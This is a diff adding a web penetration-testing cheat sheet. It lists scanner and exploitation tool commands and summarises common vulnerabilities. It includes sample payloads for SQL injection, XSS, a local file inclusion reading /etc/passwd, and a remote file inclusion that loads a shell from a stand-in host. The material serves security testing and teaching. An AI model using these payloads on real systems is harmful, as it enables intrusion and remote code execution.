@@ -1,0 +1,74 @@
+1. Tools
+Web Application Scanners
+Nikto: Scans for thousands of potentially dangerous files/CGIs.
+Command: nikto -h http://example.com
+OWASP ZAP: An open-source web application security scanner.
+Command: zap.sh -cmd -quickurl http://example.com
+Burp Suite: A comprehensive tool for web application security testing.
+Command: burpsuite
+Vulnerability Scanners
+Nessus: Scans for vulnerabilities in web applications and networks.
+Command: nessuscli
+OpenVAS: An open-source vulnerability scanner.
+Command: openvas
+Exploitation Frameworks
+Metasploit: A powerful exploitation framework.
+Command: msfconsole
+SQLMap: Automates the process of detecting and exploiting SQL injection flaws.
+Command: sqlmap -u "http://example.com/vuln.php?id=1" --dbs
+Enumeration Tools
+Dirb: Scans directories and files on web servers.
+Command: dirb http://example.com
+Gobuster: An advanced tool for directory and file brute-forcing.
+Command: gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+Manual Testing Tools
+Curl: A command-line tool for transferring data with URLs.
+Command: curl -X POST -d "input=<script>alert('XSS')</script>" http://example.com/vuln.php
+Wget: A non-interactive network downloader.
+Command: wget http://example.com/vuln.php
+Browser Extensions
+Tamper Data: Allows you to view and modify HTTP/HTTPS headers.
+Burp Suite Extension: Integrates Burp Suite with your browser.
+2. Common Vulnerabilities
+SQL Injection
+Detection: Use tools like SQLMap or manually test with payloads like id=1' OR '1'='1.
+Exploitation: Extract database information, modify data, or bypass authentication.
+Cross-Site Scripting (XSS)
+Stored XSS: Injecting malicious scripts that are stored on the server.
+Example: input=<script>alert('XSS')</script>
+Reflected XSS: Injecting malicious scripts that are reflected back to the user.
+Example: http://example.com/vuln.php?input=<script>alert('XSS')</script>
+Detection: Use tools like Burp Suite or manually test with payloads.
+Cross-Site Request Forgery (CSRF)
+Detection: Check if the application uses anti-CSRF tokens.
+Exploitation: Trick a user into submitting a malicious request.
+Broken Authentication and Session Management
+Detection: Test for weak session management, lack of multi-factor authentication, and session fixation.
+Exploitation: Hijack sessions, brute-force credentials, or bypass authentication.
+Insecure Deserialization
+Detection: Identify deserialization endpoints and test for vulnerabilities.
+Exploitation: Inject malicious data to execute arbitrary code.
+Security Misconfiguration
+Detection: Check for default configurations, unnecessary services, and verbose error messages.
+Exploitation: Exploit misconfigurations to gain unauthorized access.
+Insecure Communication
+Detection: Check for the use of HTTPS, proper certificate management, and secure cookie attributes.
+Exploitation: Intercept and modify data in transit.
+Sensitive Data Exposure
+Detection: Identify exposed sensitive data such as passwords, tokens, and personal information.
+Exploitation: Extract and misuse sensitive data.
+Broken Access Control
+Detection: Test for improper access controls, horizontal and vertical privilege escalation.
+Exploitation: Access unauthorized resources or perform unauthorized actions.
+Server-Side Request Forgery (SSRF)
+Detection: Identify endpoints that make requests to internal services.
+Exploitation: Make requests to internal services to bypass firewall restrictions or access sensitive data.
+Command Injection
+Detection: Test for injection points in user input that is used in system commands.
+Exploitation: Execute arbitrary system commands.
+File Inclusion Vulnerabilities
+Local File Inclusion (LFI): Include local files on the server.
+Example: http://example.com/vuln.php?page=../../../../etc/passwd
+Remote File Inclusion (RFI): Include remote files.
+Example: http://example.com/vuln.php?page=http://malicious.com/shell.php
+
